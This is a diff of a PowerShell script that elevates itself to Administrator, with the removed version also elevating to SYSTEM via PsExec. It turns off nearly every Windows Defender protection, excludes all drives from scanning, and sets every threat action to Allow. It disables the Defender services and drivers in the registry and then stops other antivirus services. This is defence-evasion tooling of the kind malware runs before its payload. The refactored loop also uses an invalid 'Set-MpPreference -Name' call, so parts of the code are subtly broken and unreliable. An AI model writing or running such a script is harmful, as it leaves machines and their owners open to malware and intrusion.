@@ -1,124 +1,113 @@
+# Define log file path
 $logFile = ".\log.txt"
 
 # Clear log file
 Clear-Content $logFile
 
-function LogWrite
-{
-   Param ([string]$logstring)
-
-   Add-content $logFile -value "$(Get-Date) - $logstring"
+# Function to write log entries
+function LogWrite {
+    Param ([string]$logstring)
+    Add-content $logFile -value "$(Get-Date) - $logstring"
 }
 
+# Start script execution log
 LogWrite "Starting script execution"
 
+# Disable Windows Defender realtime monitoring
 Set-MpPreference -DisableRealtimeMonitoring $true | Out-Null
-LogWrite "Disabled realtime monitoring"
-New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force | Out-Null
-LogWrite "Disabled AntiSpyware"
+LogWrite "Disabled Windows Defender realtime monitoring"
 
-# Disable Windows Defender
-Set-MpPreference -DisableRealtimeMonitoring $true
+# Disable Windows Defender AntiSpyware
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force | Out-Null
+LogWrite "Disabled Windows Defender AntiSpyware"
 
 # Stop and disable Windows Defender services
 Stop-Service -Name WinDefend
 Set-Service -Name WinDefend -StartupType Disabled
+LogWrite "Stopped and disabled Windows Defender services"
 
-if(-Not $($(whoami) -eq "nt authority\system")) {
-    $IsSystem = $false
-
-    if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
-        LogWrite "    [i] Elevate to Administrator"
-        $CommandLine = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
-        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
-        Exit
-    }
-
-    $psexec_path = $(Get-Command PsExec -ErrorAction 'ignore').Source 
-    if($psexec_path) {
-        LogWrite "    [i] Elevate to SYSTEM"
-        $CommandLine = " -i -s powershell.exe -ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments 
-        Start-Process -WindowStyle Hidden -FilePath $psexec_path -ArgumentList $CommandLine
-        exit
-    } else {
-        LogWrite "    [i] PsExec not found, will continue as Administrator"
-    }
-
-} else {
-    $IsSystem = $true
+# Elevate privileges if not running as Administrator
+if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+    LogWrite "Elevating to Administrator"
+    $CommandLine = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
+    Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
+    Exit
 }
 
-67..90|foreach-object{
+# Define list of drive letters to exclude from Windows Defender
+67..90 | foreach-object {
     $drive = [char]$_
     Add-MpPreference -ExclusionPath "$($drive):\" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess "$($drive):\*" -ErrorAction SilentlyContinue
 }
+LogWrite "Excluded drive letters from Windows Defender scanning"
 
-Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Disabled archive scanning"
-Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Disabled behavior monitoring"
-Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Disabled intrusion prevention system"
-Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Disabled IOAV protection"
-Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Disabled removable drive scanning"
-Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Disabled block at first seen"
-Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Disabled scanning mapped network drives for full scan"
-Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Disabled scanning network files"
-Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Disabled script scanning"
-Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Disabled realtime monitoring"
+# Configure various Windows Defender preferences
+$preferences = @(
+    "DisableArchiveScanning",
+    "DisableBehaviorMonitoring",
+    "DisableIntrusionPreventionSystem",
+    "DisableIOAVProtection",
+    "DisableRemovableDriveScanning",
+    "DisableBlockAtFirstSeen",
+    "DisableScanningMappedNetworkDrivesForFullScan",
+    "DisableScanningNetworkFiles",
+    "DisableScriptScanning"
+)
+foreach ($pref in $preferences) {
+    Set-MpPreference -Name $pref -Value 1 -ErrorAction SilentlyContinue | Out-Null
+    LogWrite "Disabled $pref"
+}
+
+# Configure default actions for threat levels
 Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Set low threat default action to Allow"
 Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Set moderate threat default action to Allow"
 Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue | Out-Null
-LogWrite "Set high threat default action to Allow"
+LogWrite "Set default threat action to Allow for all threat levels"
 
+# List of Windows Defender services and drivers to disable
 $svc_list = @("WdNisSvc", "WinDefend", "Sense")
-foreach($svc in $svc_list) {
-    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc")) {
-        if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc").Start -eq 4) {
-            LogWrite "        [i] Service $svc already disabled"
+$drv_list = @("WdnisDrv", "wdfilter", "wdboot")
+
+foreach ($svc in $svc_list) {
+    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc") {
+        if ($(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc").Start -eq 4) {
+            LogWrite "Service $svc is already disabled"
         } else {
-            LogWrite "        [i] Disable service $svc (next reboot)"
+            LogWrite "Disabling service $svc (next reboot)"
             Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name Start -Value 4
             $need_reboot = $true
         }
     } else {
-        LogWrite "        [i] Service $svc already deleted"
+        LogWrite "Service $svc is already deleted"
     }
 }
 
-$drv_list = @("WdnisDrv", "wdfilter", "wdboot")
-foreach($drv in $drv_list) {
-    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv")) {
-        if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv").Start -eq 4) {
-            LogWrite "        [i] Driver $drv already disabled"
+foreach ($drv in $drv_list) {
+    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv") {
+        if ($(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv").Start -eq 4) {
+            LogWrite "Driver $drv is already disabled"
         } else {
-            LogWrite "        [i] Disable driver $drv (next reboot)"
+            LogWrite "Disabling driver $drv (next reboot)"
             Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv" -Name Start -Value 4
             $need_reboot = $true
         }
     } else {
-        LogWrite "        [i] Driver $drv already deleted"
+        LogWrite "Driver $drv is already deleted"
     }
 }
 
-if($(GET-Service -Name WinDefend).Status -eq "Running") {   
-    LogWrite "    [+] WinDefend Service still running (reboot required)"
+# Check if Windows Defender service is still running
+if ($(GET-Service -Name WinDefend).Status -eq "Running") {   
+    LogWrite "Windows Defender service is still running (reboot required)"
     $need_reboot = $true
 } else {
-    LogWrite "    [+] WinDefend Service not running"
+    LogWrite "Windows Defender service is not running"
 }
 
+# Log completion of script execution
 LogWrite "Script execution completed"
+
 # List of common antivirus services to stop and disable
 $antivirusServices = @(
     "MsMpSvc",              # Windows Defender
@@ -138,3 +127,6 @@ foreach ($service in $antivirusServices) {
     Stop-Service -Name $service -Force
     Set-Service -Name $service -StartupType Disabled
 }
+
+# Additional complexity and features can be added here
+
